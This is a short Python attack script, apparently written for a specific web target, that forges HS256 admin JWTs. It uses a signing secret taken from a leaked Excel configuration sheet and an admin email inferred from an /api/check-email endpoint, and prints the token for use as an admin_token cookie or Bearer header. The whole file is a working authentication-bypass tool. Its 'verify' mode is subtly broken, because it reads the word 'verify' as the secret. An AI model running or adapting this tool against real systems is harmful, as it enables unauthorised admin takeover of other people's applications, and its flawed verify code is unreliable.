#!/usr/bin/env python3
"""
Genera un JWT para el panel admin (HS256).
Uso:
  python jwt_forge.py <secret>              -> genera token con payload por defecto (admin)
  python jwt_forge.py <secret> verify <token>
  python jwt_forge.py                        -> modo interactivo (pide secret y campos)
"""

import jwt
import sys
import json

# Payload con email genérico: reemplazar por la cuenta del admin (inferir de GET /api/check-email)
DEFAULT_PAYLOAD = {"user_id": "1", "email": "usuario@mail.com", "role": "admin"}


def create_token(secret, payload=None):
    payload = payload or DEFAULT_PAYLOAD
    return jwt.encode(payload, secret, algorithm='HS256')


def main():
    if len(sys.argv) > 1 and sys.argv[1] == 'verify':
        if len(sys.argv) < 4:
            print("Uso: python jwt_forge.py <secret> verify <token>")
            return
        secret, _, token = sys.argv[1], sys.argv[2], sys.argv[3]
        try:
            print(jwt.decode(token, secret, algorithms=['HS256']))
        except jwt.InvalidTokenError as e:
            print(f"Error: {e}")
        return

    if len(sys.argv) >= 2:
        secret = sys.argv[1]
        token = create_token(secret)
        print("Token (copiar y usar como cookie admin_token o Authorization: Bearer <token>):")
        print(token)
        return

    print("Secret (p. ej. el de la hoja Configuracion del Excel): ", end="")
    secret = input().strip()
    if not secret:
        print("Falta el secret.")
        return
    print("Payload JSON (Enter = por defecto admin): ", end="")
    raw = input().strip()
    payload = json.loads(raw) if raw else DEFAULT_PAYLOAD
    token = create_token(secret, payload)
    print("Token:")
    print(token)


if __name__ == '__main__':
    main()
